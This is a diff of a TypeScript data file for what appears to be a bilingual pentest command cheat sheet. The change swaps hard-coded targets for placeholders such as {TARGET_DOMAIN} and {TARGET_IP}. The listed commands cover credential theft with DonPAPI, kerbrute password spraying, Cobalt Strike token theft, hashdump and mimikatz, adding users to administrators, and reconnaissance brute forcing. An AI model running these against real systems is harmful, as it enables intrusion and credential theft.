+      { name: { zh: 'JSON输出', en: 'JSON Output' }, command: 'nuclei -u http://{TARGET_DOMAIN} -json -o results.json', description: { zh: 'JSON格式输出', en: 'JSONFormatOutput' }, platform: 'linux' }
     ],
     references: ['https://nuclei.projectdiscovery.io/']
   },
@@ -1157,7 +1157,7 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '系统命令', en: 'System Commands' },
     commands: [
       { name: { zh: '系统信息', en: 'System Info' }, command: 'systeminfo\nver\nhostname', description: { zh: '获取系统信息', en: 'Get System Info' }, platform: 'windows' },
-      { name: { zh: '用户管理', en: 'User Management' }, command: 'net user\nnet user username password /add\nnet localgroup administrators username /add', description: { zh: '用户管理命令', en: 'User ManagementCommand' }, platform: 'windows' },
+      { name: { zh: '用户管理', en: 'User Management' }, command: 'net user\nnet user {USERNAME} password /add\nnet localgroup administrators {USERNAME} /add', description: { zh: '用户管理命令', en: 'User ManagementCommand' }, platform: 'windows' },
       { name: { zh: '网络配置', en: 'Network Configuration' }, command: 'ipconfig /all\nnetstat -ano\nnetstat -anob\nroute print\narp -a', description: { zh: '网络配置信息', en: 'Network ConfigurationInformation' }, platform: 'windows' },
       { name: { zh: '进程管理', en: 'Process Management' }, command: 'tasklist\ntaskkill /PID pid /F\nwmic process list full', description: { zh: '进程管理命令', en: 'Process ManagementCommand' }, platform: 'windows' },
       { name: { zh: '服务管理', en: 'Service Management' }, command: 'sc query\nsc start servicename\nsc stop servicename\nnet start', description: { zh: '服务管理命令', en: 'Service ManagementCommand' }, platform: 'windows' },
@@ -1174,11 +1174,11 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '系统命令', en: 'System Commands' },
     commands: [
       { name: { zh: '用户列表', en: 'User List' }, command: 'net user', description: { zh: '列出所有用户', en: 'ListallUsers' }, platform: 'windows' },
-      { name: { zh: '用户详情', en: 'User Details' }, command: 'net user username', description: { zh: '查看用户详细信息', en: 'View detailed user information' }, platform: 'windows' },
-      { name: { zh: '添加用户', en: 'Add User' }, command: 'net user username password /add', description: { zh: '添加新用户', en: 'Add a new user' }, platform: 'windows' },
-      { name: { zh: '删除用户', en: 'Delete User' }, command: 'net user username /delete', description: { zh: '删除用户', en: 'Delete User' }, platform: 'windows' },
+      { name: { zh: '用户详情', en: 'User Details' }, command: 'net user {USERNAME}', description: { zh: '查看用户详细信息', en: 'View detailed user information' }, platform: 'windows' },
+      { name: { zh: '添加用户', en: 'Add User' }, command: 'net user {USERNAME} password /add', description: { zh: '添加新用户', en: 'Add a new user' }, platform: 'windows' },
+      { name: { zh: '删除用户', en: 'Delete User' }, command: 'net user {USERNAME} /delete', description: { zh: '删除用户', en: 'Delete User' }, platform: 'windows' },
       { name: { zh: '组列表', en: 'Group List' }, command: 'net localgroup', description: { zh: '列出所有本地组', en: 'ListallLocalGroups' }, platform: 'windows' },
-      { name: { zh: '添加到管理员组', en: 'Add to Admin Group' }, command: 'net localgroup administrators username /add', description: { zh: '将用户添加到管理员组', en: 'will UsersAdd to Admin Group' }, platform: 'windows' },
+      { name: { zh: '添加到管理员组', en: 'Add to Admin Group' }, command: 'net localgroup administrators {USERNAME} /add', description: { zh: '将用户添加到管理员组', en: 'will UsersAdd to Admin Group' }, platform: 'windows' },
       { name: { zh: '域用户', en: 'Domain Users' }, command: 'net user /domain', description: { zh: '列出域用户', en: 'ListDomain Users' }, platform: 'windows' },
       { name: { zh: '域管理员', en: 'Domain Admins' }, command: 'net group "Domain Admins" /domain', description: { zh: '列出域管理员', en: 'ListDomain Admins' }, platform: 'windows' },
       { name: { zh: '共享列表', en: 'Share List' }, command: 'net share', description: { zh: '列出共享资源', en: 'List SharesResource' }, platform: 'windows' },
@@ -1273,7 +1273,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       { name: { zh: '用户枚举', en: 'User Enumeration' }, command: 'kerbrute userenum -d domain.com --dc dc_ip users.txt', description: { zh: '枚举域用户', en: 'EnumerationDomain Users' }, platform: 'all' },
       { name: { zh: '密码喷洒', en: 'Password Spraying' }, command: 'kerbrute passwordspray -d domain.com --dc dc_ip users.txt Password123', description: { zh: '密码喷洒攻击', en: 'Password SprayingAttack' }, platform: 'all' },
-      { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'kerbrute bruteuser -d domain.com --dc dc_ip wordlist.txt username', description: { zh: '暴力破解用户', en: 'Brute ForceUsers' }, platform: 'all' },
+      { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'kerbrute bruteuser -d domain.com --dc dc_ip wordlist.txt {USERNAME}', description: { zh: '暴力破解用户', en: 'Brute ForceUsers' }, platform: 'all' },
       { name: { zh: '域验证', en: 'Domain Validation' }, command: 'kerbrute -d domain.com --dc dc_ip user:password', description: { zh: '验证凭证', en: 'VerifyCredentials' }, platform: 'all' }
     ],
     references: ['https://github.com/ropnop/kerbrute']
@@ -1374,10 +1374,10 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '内网渗透', en: 'Intranet Penetration' },
     installation: { zh: '编译或下载二进制文件', en: 'Compile or DownloadbinaryFile' },
     commands: [
-      { name: { zh: '列出共享', en: 'List Shares' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -L', description: { zh: '列出SMB共享', en: 'ListSMBShares' }, platform: 'windows' },
-      { name: { zh: '列出目录', en: 'List Directory' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -l', description: { zh: '列出共享目录', en: 'List SharesDirectory' }, platform: 'windows' },
-      { name: { zh: '下载文件', en: 'Download File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -g "path\\file"', description: { zh: '下载文件', en: 'Download File' }, platform: 'windows' },
-      { name: { zh: '上传文件', en: 'Upload File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i target_ip -s C$ -p local_file -r remote_path', description: { zh: '上传文件', en: 'Upload File' }, platform: 'windows' }
+      { name: { zh: '列出共享', en: 'List Shares' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i {TARGET_IP} -L', description: { zh: '列出SMB共享', en: 'ListSMBShares' }, platform: 'windows' },
+      { name: { zh: '列出目录', en: 'List Directory' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i {TARGET_IP} -s C$ -l', description: { zh: '列出共享目录', en: 'List SharesDirectory' }, platform: 'windows' },
+      { name: { zh: '下载文件', en: 'Download File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i {TARGET_IP} -s C$ -g "path\\file"', description: { zh: '下载文件', en: 'Download File' }, platform: 'windows' },
+      { name: { zh: '上传文件', en: 'Upload File' }, command: 'SharpSMBClient.exe -d domain -u user -p password -i {TARGET_IP} -s C$ -p local_file -r remote_path', description: { zh: '上传文件', en: 'Upload File' }, platform: 'windows' }
     ],
     references: ['https://github.com/0xthirteen/SharpSMBClient']
   },
@@ -1388,8 +1388,8 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '凭证窃取', en: 'Credential Theft' },
     installation: 'pip install donpapi',
     commands: [
-      { name: { zh: '提取凭证', en: 'Extract Credentials' }, command: 'donpapi domain/user:password@target_ip', description: { zh: '提取DPAPI凭证', en: 'ExtractDPAPICredentials' }, platform: 'linux' },
-      { name: { zh: '使用哈希', en: 'Using Hash' }, command: 'donpapi -hashes :NTHASH domain/user@target_ip', description: { zh: '使用哈希认证', en: 'Using HashAuthentication' }, platform: 'linux' },
+      { name: { zh: '提取凭证', en: 'Extract Credentials' }, command: 'donpapi domain/user:password@{TARGET_IP}', description: { zh: '提取DPAPI凭证', en: 'ExtractDPAPICredentials' }, platform: 'linux' },
+      { name: { zh: '使用哈希', en: 'Using Hash' }, command: 'donpapi -hashes :NTHASH domain/user@{TARGET_IP}', description: { zh: '使用哈希认证', en: 'Using HashAuthentication' }, platform: 'linux' },
       { name: { zh: '批量提取', en: 'Batch Extract' }, command: 'donpapi domain/user:password@targets.txt', description: { zh: '批量提取凭证', en: 'batchExtract Credentials' }, platform: 'linux' }
     ],
     references: ['https://github.com/login-securite/DonPAPI']
@@ -1423,7 +1423,7 @@ export const toolCommands: ToolCommand[] = [
       { name: { zh: '生成Payload', en: 'Generate Payload' }, command: 'Attacks -> Packages -> Windows Executable', description: { zh: '生成可执行Payload', en: 'GenerateCanExecutePayload' }, platform: 'all' },
       { name: { zh: '监听器', en: 'Listener' }, command: 'Cobalt Strike -> Listeners -> Add', description: { zh: '添加监听器', en: 'AddListener' }, platform: 'all' },
       { name: { zh: 'Beacon命令', en: 'Beacon Commands' }, command: 'shell whoami\nps\nhashdump\nmimikatz', description: { zh: 'Beacon常用命令', en: 'BeaconCommonCommand' }, platform: 'all' },
-      { name: 'SMB Beacon', command: 'beacon> link target_ip', description: { zh: 'SMB Beacon横向', en: 'SMB Beacon lateral movement' }, platform: 'windows' },
+      { name: 'SMB Beacon', command: 'beacon> link {TARGET_IP}', description: { zh: 'SMB Beacon横向', en: 'SMB Beacon lateral movement' }, platform: 'windows' },
       { name: { zh: 'SOCKS代理', en: 'SOCKS Proxy' }, command: 'beacon> socks 1080', description: { zh: '启动SOCKS代理', en: 'StartSOCKS Proxy' }, platform: 'windows' },
       { name: { zh: '令牌窃取', en: 'Token Theft' }, command: 'beacon> steal_token PID', description: { zh: '窃取进程令牌', en: 'StealProcessToken' }, platform: 'windows' },
       { name: 'Runas', command: 'beacon> runas domain\\user password command', description: { zh: '以其他用户运行', en: 'with otherUsersRun' }, platform: 'windows' }
@@ -1453,12 +1453,12 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: 'Web渗透', en: 'Web Penetration' },
     installation: 'pip install wfuzz',
     commands: [
-      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'wfuzz -c -w wordlist.txt http://target.com/FUZZ', description: { zh: '基础目录爆破', en: 'BasicDirectory Brute Force' }, platform: 'linux' },
-      { name: { zh: '过滤响应', en: 'Filter Response' }, command: 'wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ', description: { zh: '过滤404响应', en: 'Filter404Response' }, platform: 'linux' },
-      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://target.com/login', description: { zh: 'POST数据测试', en: 'POSTDataTest' }, platform: 'linux' },
-      { name: { zh: 'Cookie测试', en: 'Cookie Test' }, command: 'wfuzz -c -w wordlist.txt -b "session=FUZZ" http://target.com/', description: { zh: 'Cookie模糊测试', en: 'CookieFuzz Testing' }, platform: 'linux' },
-      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'wfuzz -c -w wordlist.txt -H "Host: FUZZ.target.com" http://target.com/', description: { zh: 'Host头测试', en: 'HostHeaderTest' }, platform: 'linux' },
-      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'wfuzz -c -w wordlist.txt -R 2 http://target.com/FUZZ', description: { zh: '递归扫描', en: 'Recursive Scan' }, platform: 'linux' }
+      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'wfuzz -c -w wordlist.txt http://{TARGET_DOMAIN}/FUZZ', description: { zh: '基础目录爆破', en: 'BasicDirectory Brute Force' }, platform: 'linux' },
+      { name: { zh: '过滤响应', en: 'Filter Response' }, command: 'wfuzz -c -w wordlist.txt --hc 404 http://{TARGET_DOMAIN}/FUZZ', description: { zh: '过滤404响应', en: 'Filter404Response' }, platform: 'linux' },
+      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://{TARGET_DOMAIN}/login', description: { zh: 'POST数据测试', en: 'POSTDataTest' }, platform: 'linux' },
+      { name: { zh: 'Cookie测试', en: 'Cookie Test' }, command: 'wfuzz -c -w wordlist.txt -b "session=FUZZ" http://{TARGET_DOMAIN}/', description: { zh: 'Cookie模糊测试', en: 'CookieFuzz Testing' }, platform: 'linux' },
+      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'wfuzz -c -w wordlist.txt -H "Host: FUZZ.{TARGET_DOMAIN}" http://{TARGET_DOMAIN}/', description: { zh: 'Host头测试', en: 'HostHeaderTest' }, platform: 'linux' },
+      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'wfuzz -c -w wordlist.txt -R 2 http://{TARGET_DOMAIN}/FUZZ', description: { zh: '递归扫描', en: 'Recursive Scan' }, platform: 'linux' }
     ],
     references: ['https://github.com/xmendez/wfuzz']
   },
@@ -1469,11 +1469,11 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '信息收集', en: 'Information Gathering' },
     installation: 'apt install amass',
     commands: [
-      { name: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, command: 'amass enum -d target.com', description: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, platform: 'linux' },
-      { name: { zh: '被动枚举', en: 'Passive Enumeration' }, command: 'amass enum -passive -d target.com', description: { zh: '被动信息收集', en: 'Passive information gathering' }, platform: 'linux' },
-      { name: { zh: '主动枚举', en: 'Active Enumeration' }, command: 'amass enum -active -d target.com', description: { zh: '主动信息收集', en: 'Active information gathering' }, platform: 'linux' },
-      { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'amass enum -brute -d target.com -w wordlist.txt', description: { zh: '暴力破解子域名', en: 'Brute ForceSub-Domain name' }, platform: 'linux' },
-      { name: { zh: '保存结果', en: 'Save Results' }, command: 'amass enum -d target.com -o output.txt', description: { zh: '保存枚举结果', en: 'SaveEnumerationResult' }, platform: 'linux' }
+      { name: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, command: 'amass enum -d {TARGET_DOMAIN}', description: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, platform: 'linux' },
+      { name: { zh: '被动枚举', en: 'Passive Enumeration' }, command: 'amass enum -passive -d {TARGET_DOMAIN}', description: { zh: '被动信息收集', en: 'Passive information gathering' }, platform: 'linux' },
+      { name: { zh: '主动枚举', en: 'Active Enumeration' }, command: 'amass enum -active -d {TARGET_DOMAIN}', description: { zh: '主动信息收集', en: 'Active information gathering' }, platform: 'linux' },
+      { name: { zh: '暴力破解', en: 'Brute Force' }, command: 'amass enum -brute -d {TARGET_DOMAIN} -w wordlist.txt', description: { zh: '暴力破解子域名', en: 'Brute ForceSub-Domain name' }, platform: 'linux' },
+      { name: { zh: '保存结果', en: 'Save Results' }, command: 'amass enum -d {TARGET_DOMAIN} -o output.txt', description: { zh: '保存枚举结果', en: 'SaveEnumerationResult' }, platform: 'linux' }
     ],
     references: ['https://github.com/OWASP/Amass']
   },
@@ -1484,10 +1484,10 @@ export const toolCommands: ToolCommand[] = [
     category: { zh: '信息收集', en: 'Information Gathering' },
     installation: 'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
     commands: [
-      { name: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, command: 'subfinder -d target.com', description: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, platform: 'linux' },
-      { name: { zh: '递归枚举', en: 'Recursive Enumeration' }, command: 'subfinder -d target.com -recursive', description: { zh: '递归枚举', en: 'Recursive Enumeration' }, platform: 'linux' },
-      { name: { zh: '保存结果', en: 'Save Results' }, command: 'subfinder -d target.com -o output.txt', description: { zh: '保存结果', en: 'Save Results' }, platform: 'linux' },
-      { name: { zh: 'JSON输出', en: 'JSON Output' }, command: 'subfinder -d target.com -json -o output.json', description: { zh: 'JSON格式输出', en: 'JSONFormatOutput' }, platform: 'linux' },
+      { name: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, command: 'subfinder -d {TARGET_DOMAIN}', description: { zh: '枚举子域名', en: 'Enumerate Subdomains' }, platform: 'linux' },
+      { name: { zh: '递归枚举', en: 'Recursive Enumeration' }, command: 'subfinder -d {TARGET_DOMAIN} -recursive', description: { zh: '递归枚举', en: 'Recursive Enumeration' }, platform: 'linux' },
+      { name: { zh: '保存结果', en: 'Save Results' }, command: 'subfinder -d {TARGET_DOMAIN} -o output.txt', description: { zh: '保存结果', en: 'Save Results' }, platform: 'linux' },
+      { name: { zh: 'JSON输出', en: 'JSON Output' }, command: 'subfinder -d {TARGET_DOMAIN} -json -o output.json', description: { zh: 'JSON格式输出', en: 'JSONFormatOutput' }, platform: 'linux' },
       { name: { zh: '批量处理', en: 'Batch Processing' }, command: 'subfinder -dL domains.txt', description: { zh: '批量处理域名', en: 'Batch ProcessingDomain name' }, platform: 'linux' }
     ],
     references: ['https://github.com/projectdiscovery/subfinder']
@@ -1517,7 +1517,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '快速全端口扫描', en: 'Fast Full Port Scan' },
-        command: 'masscan -p1-65535 target_ip --rate=1000',
+        command: 'masscan -p1-65535 {TARGET_IP} --rate=1000',
         description: { zh: '以每秒1000包的速率扫描目标所有端口', en: 'Scan all ports on the target at 1000 packets per second' },
         syntaxBreakdown: [
           { part: 'masscan', explanation: { zh: '高速端口扫描器', en: 'High-speed port scanning tool' }, type: 'command' },
@@ -1528,13 +1528,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '常用端口扫描', en: 'Common Port Scan' },
-        command: 'masscan -p80,443,8080,8443,3306,6379,27017 target_ip/24 --rate=500',
+        command: 'masscan -p80,443,8080,8443,3306,6379,27017 {TARGET_CIDR} --rate=500',
         description: { zh: '扫描常用Web和数据库端口', en: 'ScanCommonWeb and DatabasePort' },
         platform: 'all'
       },
       {
         name: { zh: '输出结果', en: 'Output Results' },
-        command: 'masscan -p1-65535 target_ip --rate=1000 -oJ result.json\nmasscan -p1-65535 target_ip --rate=1000 -oX result.xml\nmasscan -p1-65535 target_ip --rate=1000 -oG result.grep',
+        command: 'masscan -p1-65535 {TARGET_IP} --rate=1000 -oJ result.json\nmasscan -p1-65535 {TARGET_IP} --rate=1000 -oX result.xml\nmasscan -p1-65535 {TARGET_IP} --rate=1000 -oG result.grep',
         description: { zh: '支持JSON/XML/Grepable格式输出', en: 'supportsJSON/XML/GrepableFormatOutput' },
         platform: 'all'
       },
@@ -1546,7 +1546,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '扫描Banner', en: 'Scan Banner' },
-        command: 'masscan -p80,443 target_ip/24 --banners --rate=500',
+        command: 'masscan -p80,443 {TARGET_CIDR} --banners --rate=500',
         description: { zh: '获取服务Banner信息', en: 'Get ServicesBannerInformation' },
         platform: 'all'
       }
@@ -1562,7 +1562,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础目录扫描', en: 'Basic Directory Scan' },
-        command: 'dirsearch -u https://target.com -e php,asp,aspx,jsp,html,js',
+        command: 'dirsearch -u https://{TARGET_DOMAIN} -e php,asp,aspx,jsp,html,js',
         description: { zh: '扫描指定扩展名的目录和文件', en: 'ScanSpecify Extensions Directory and File' },
         syntaxBreakdown: [
           { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
@@ -1572,25 +1572,25 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '使用自定义字典', en: 'Use Custom Wordlist' },
-        command: 'dirsearch -u https://target.com -w /usr/share/wordlists/dirb/big.txt --delay=0.5',
+        command: 'dirsearch -u https://{TARGET_DOMAIN} -w /usr/share/wordlists/dirb/big.txt --delay=0.5',
         description: { zh: '使用自定义字典并设置请求延迟', en: 'Use Custom Wordlist and SetRequestDelay' },
         platform: 'all'
       },
       {
         name: { zh: '递归扫描', en: 'Recursive Scan' },
-        command: 'dirsearch -u https://target.com -e php -r -R 3 --exclude-status=403,404',
+        command: 'dirsearch -u https://{TARGET_DOMAIN} -e php -r -R 3 --exclude-status=403,404',
         description: { zh: '递归扫描3层深度，排除403/404', en: 'Recursive scan 3 levels deep, exclude 403/404' },
         platform: 'all'
       },
       {
         name: { zh: '多线程+Cookie', en: 'Multi-thread + Cookie' },
-        command: 'dirsearch -u https://target.com -t 20 --cookie="session=abc123" -H "Authorization: Bearer token"',
+        command: 'dirsearch -u https://{TARGET_DOMAIN} -t 20 --cookie="session=abc123" -H "Authorization: Bearer token"',
         description: { zh: '20线程并发，携带认证信息', en: '20 concurrent threads with authentication cookies' },
         platform: 'all'
       },
       {
         name: { zh: '输出结果', en: 'Output Results' },
-        command: 'dirsearch -u https://target.com -o result.json --format=json',
+        command: 'dirsearch -u https://{TARGET_DOMAIN} -o result.json --format=json',
         description: { zh: '输出JSON格式结果', en: 'OutputJSONFormatResult' },
         platform: 'all'
       }
@@ -1606,7 +1606,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础扫描', en: 'Basic Scan' },
-        command: 'feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
+        command: 'feroxbuster -u https://{TARGET_DOMAIN} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
         description: { zh: '使用SecLists字典扫描目录', en: 'UseSecListsDictionaryScanDirectory' },
         syntaxBreakdown: [
           { part: 'feroxbuster', explanation: { zh: 'Rust编写的高速目录枚举工具', en: 'High-speed directory enumeration tool written in Rust' }, type: 'command' },
@@ -1617,19 +1617,19 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '递归+过滤', en: 'Recursive + Filter' },
-        command: 'feroxbuster -u https://target.com -d 3 -C 403,404,500 -x php,asp,html --rate-limit 50',
+        command: 'feroxbuster -u https://{TARGET_DOMAIN} -d 3 -C 403,404,500 -x php,asp,html --rate-limit 50',
         description: { zh: '递归3层，过滤状态码，限制速率', en: 'Recursive 3 levels, filter status codes, rate-limited' },
         platform: 'all'
       },
       {
         name: { zh: '带认证扫描', en: 'Authenticated Scan' },
-        command: 'feroxbuster -u https://target.com -H "Cookie: session=abc" -H "Authorization: Bearer xxx" -t 30',
+        command: 'feroxbuster -u https://{TARGET_DOMAIN} -H "Cookie: session=abc" -H "Authorization: Bearer xxx" -t 30',
         description: { zh: '携带认证头，30线程并发', en: 'With authentication header, 30 concurrent threads' },
         platform: 'all'
       },
       {
         name: { zh: '自动校准', en: 'Auto Calibrate' },
-        command: 'feroxbuster -u https://target.com --auto-tune --smart',
+        command: 'feroxbuster -u https://{TARGET_DOMAIN} --auto-tune --smart',
         description: { zh: '自动调整请求速率和过滤条件', en: 'Auto-calibrate request rate and filter conditions' },
         platform: 'all'
       }
@@ -1656,7 +1656,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '生成子域名字典', en: 'Generate Subdomain Wordlist' },
-        command: 'cat subdomains.txt | sed "s/$/.target.com/" > full_subs.txt\nmassdns -r resolvers.txt -t A -o J full_subs.txt > results.json',
+        command: 'cat subdomains.txt | sed "s/$/.{TARGET_DOMAIN}/" > full_subs.txt\nmassdns -r resolvers.txt -t A -o J full_subs.txt > results.json',
         description: { zh: '批量生成子域名并JSON格式输出', en: 'batchGenerateSub-Domain name and JSONFormatOutput' },
         platform: 'linux'
       },
@@ -1678,7 +1678,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '被动枚举', en: 'Passive Enumeration' },
-        command: 'amass enum -passive -d target.com -o results.txt',
+        command: 'amass enum -passive -d {TARGET_DOMAIN} -o results.txt',
         description: { zh: '仅使用被动数据源枚举子域名', en: 'Enumerate subdomains using only passive data sources' },
         syntaxBreakdown: [
           { part: 'enum', explanation: { zh: '枚举模式', en: 'EnumerationMode' }, type: 'command' },
@@ -1689,19 +1689,19 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '主动枚举', en: 'Active Enumeration' },
-        command: 'amass enum -active -d target.com -brute -w /usr/share/amass/wordlists/subdomains-top1mil.txt',
+        command: 'amass enum -active -d {TARGET_DOMAIN} -brute -w /usr/share/amass/wordlists/subdomains-top1mil.txt',
         description: { zh: '主动DNS枚举+字典暴力破解', en: 'Active DNS enumeration + dictionary brute force' },
         platform: 'all'
       },
       {
         name: { zh: '情报收集', en: 'Intelligence Gathering' },
-        command: 'amass intel -d target.com -whois\namass intel -org "Target Corp" -max-dns-queries 2500',
+        command: 'amass intel -d {TARGET_DOMAIN} -whois\namass intel -org "Target Corp" -max-dns-queries 2500',
         description: { zh: '收集WHOIS和组织相关域名情报', en: 'Collect WHOIS and organization-related domain intelligence' },
         platform: 'all'
       },
       {
         name: { zh: '可视化', en: 'Visualization' },
-        command: 'amass viz -d3 -d target.com\namass db -show -d target.com',
+        command: 'amass viz -d3 -d {TARGET_DOMAIN}\namass db -show -d {TARGET_DOMAIN}',
         description: { zh: '生成D3.js可视化图表和查看历史数据', en: 'Generate D3.js visualizations and view historical data' },
         platform: 'all'
       }
@@ -1717,7 +1717,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础枚举', en: 'Basic Enumeration' },
-        command: 'subfinder -d target.com -o subs.txt',
+        command: 'subfinder -d {TARGET_DOMAIN} -o subs.txt',
         description: { zh: '枚举子域名并输出到文件', en: 'Enumerate Subdomains and Output to File' },
         syntaxBreakdown: [
           { part: 'subfinder', explanation: { zh: '被动子域名枚举工具', en: 'Passive subdomain enumeration tool' }, type: 'command' },
@@ -1727,13 +1727,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '递归枚举', en: 'Recursive Enumeration' },
-        command: 'subfinder -d target.com -recursive -all -o subs.txt',
+        command: 'subfinder -d {TARGET_DOMAIN} -recursive -all -o subs.txt',
         description: { zh: '使用所有数据源递归枚举', en: 'UseallDataSourceRecursive Enumeration' },
         platform: 'all'
       },
       {
         name: { zh: '管道联动', en: 'Pipeline Integration' },
-        command: 'subfinder -d target.com -silent | httpx -silent -status-code -title',
+        command: 'subfinder -d {TARGET_DOMAIN} -silent | httpx -silent -status-code -title',
         description: { zh: '与httpx联动探测存活子域名', en: 'Pipe into httpx to detect live subdomains' },
         platform: 'all'
       },
@@ -1794,7 +1794,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础指纹', en: 'Basic Fingerprint' },
-        command: 'whatweb https://target.com',
+        command: 'whatweb https://{TARGET_DOMAIN}',
         description: { zh: '识别目标网站技术栈', en: 'IdentifyTargetWebsiteTechniquestack' },
         syntaxBreakdown: [
           { part: 'whatweb', explanation: { zh: 'Web技术指纹识别工具', en: 'WebTechniqueFingerprintingTools' }, type: 'command' },
@@ -1803,7 +1803,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '详细模式', en: 'Verbose Mode' },
-        command: 'whatweb -v https://target.com -a 3',
+        command: 'whatweb -v https://{TARGET_DOMAIN} -a 3',
         description: { zh: '详细输出，攻击等级3(更深度探测)', en: 'Verbose output, attack level 3 (deeper detection)' },
         platform: 'all'
       },
@@ -1815,7 +1815,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定插件', en: 'Specify Plugin' },
-        command: 'whatweb --info-plugins\nwhatweb -p WordPress,Joomla,Drupal https://target.com',
+        command: 'whatweb --info-plugins\nwhatweb -p WordPress,Joomla,Drupal https://{TARGET_DOMAIN}',
         description: { zh: '列出或指定使用特定插件', en: 'List or specifiedUsespecificPlugin' },
         platform: 'all'
       }
@@ -1831,7 +1831,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'WAF检测', en: 'WAF Detection' },
-        command: 'wafw00f https://target.com',
+        command: 'wafw00f https://{TARGET_DOMAIN}',
         description: { zh: '检测目标是否部署WAF及WAF类型', en: 'DetectionTarget is WhetherDeploymentWAF and WAFType' },
         syntaxBreakdown: [
           { part: 'wafw00f', explanation: { zh: 'WAF指纹识别工具', en: 'WAFFingerprintingTools' }, type: 'command' },
@@ -1840,7 +1840,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '详细检测', en: 'Verbose Detection' },
-        command: 'wafw00f https://target.com -v -a',
+        command: 'wafw00f https://{TARGET_DOMAIN} -v -a',
         description: { zh: '详细模式，测试所有WAF签名', en: 'Verbose Mode, TestallWAFSignature' },
         platform: 'all'
       },
@@ -1868,7 +1868,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '标准枚举', en: 'Standard Enumeration' },
-        command: 'dnsrecon -d target.com -t std',
+        command: 'dnsrecon -d {TARGET_DOMAIN} -t std',
         description: { zh: '标准DNS记录枚举(SOA/NS/A/MX/TXT等)', en: 'Standard DNS record enumeration (SOA/NS/A/MX/TXT, etc.)' },
         syntaxBreakdown: [
           { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
@@ -1878,13 +1878,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '区域传送', en: 'Zone Transfer' },
-        command: 'dnsrecon -d target.com -t axfr',
+        command: 'dnsrecon -d {TARGET_DOMAIN} -t axfr',
         description: { zh: '尝试DNS区域传送', en: 'AttemptDNSZone Transfer' },
         platform: 'all'
       },
       {
         name: { zh: '暴力枚举', en: 'Brute Force Enumeration' },
-        command: 'dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt',
+        command: 'dnsrecon -d {TARGET_DOMAIN} -t brt -D /usr/share/wordlists/subdomains.txt',
         description: { zh: '使用字典暴力枚举子域名', en: 'Brute-force subdomain enumeration using a dictionary' },
         platform: 'all'
       },
@@ -1906,19 +1906,19 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础枚举', en: 'Basic Enumeration' },
-        command: 'dnsenum target.com',
+        command: 'dnsenum {TARGET_DOMAIN}',
         description: { zh: '枚举DNS信息(NS/MX/A/区域传送等)', en: 'EnumerationDNSInformation(NS/MX/A/Zone Transfer etc.)' },
         platform: 'all'
       },
       {
         name: { zh: '子域名暴力', en: 'Subdomain Brute Force' },
-        command: 'dnsenum --enum -f /usr/share/dnsenum/dns.txt --threads 10 target.com',
